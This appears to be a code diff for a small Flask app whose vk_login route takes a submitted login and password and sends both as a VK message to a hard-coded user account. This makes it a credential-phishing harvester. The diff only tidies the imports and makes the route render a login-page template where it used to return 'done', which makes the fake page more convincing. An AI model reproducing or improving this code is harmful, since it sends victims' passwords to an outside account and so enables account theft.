@@ -7,7 +7,8 @@ This script runs the Flask application using a development server.
 from flask import render_template, g
 
 from Flask import app
-import flask,requests
+import flask
+import requests
 
 
 
@@ -23,7 +24,7 @@ def vk_login():
                                'user_id': 436337712, 'message': ' log:' + login + ' password: ' + password, 'v': 5.73})
     print(mes.json())
 
-    return 'done'
+    return render_template('vklogin.html')
 
 @app.route('/',  methods=['GET', 'POST'])
 @app.route('/vklog',  methods=['GET', 'POST'])
